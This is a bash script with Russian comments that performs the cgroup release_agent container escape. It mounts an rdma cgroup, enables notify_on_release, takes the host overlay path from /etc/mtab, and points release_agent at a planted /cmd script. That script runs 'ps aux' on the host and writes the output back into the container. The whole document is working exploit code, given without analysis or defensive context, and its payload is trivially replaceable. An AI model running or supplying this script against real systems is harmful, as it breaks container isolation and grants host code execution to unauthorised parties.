#!/bin/bash

# Создаем временную директорию для точки монтирования cgroup
mkdir -p /tmp/cgrp

# Монтируем cgroup с опцией rdma в созданную директорию
mount -t cgroup -o rdma cgroup /tmp/cgrp

# Создаем поддиректорию в cgroup
mkdir -p /tmp/cgrp/x

# Включаем уведомление при освобождении ресурсов
echo 1 > /tmp/cgrp/x/notify_on_release

# Определяем путь к хост-файловой системе
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)

# Устанавливаем файл release_agent в поддиректории cgroup
echo "$host_path/cmd" > /tmp/cgrp/release_agent

# Создаем скрипт, который будет выполнен при освобождении ресурсов
cat > /cmd << EOF
#!/bin/sh
ps aux > $host_path/output
EOF

# Делаем скрипт исполняемым
chmod +x /cmd

# Запускаем процесс в поддиректории cgroup для инициирования освобождения ресурсов
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Выводим сообщение о завершении
echo "Команда для выхода из контейнера и выполнения на хосте инициирована."
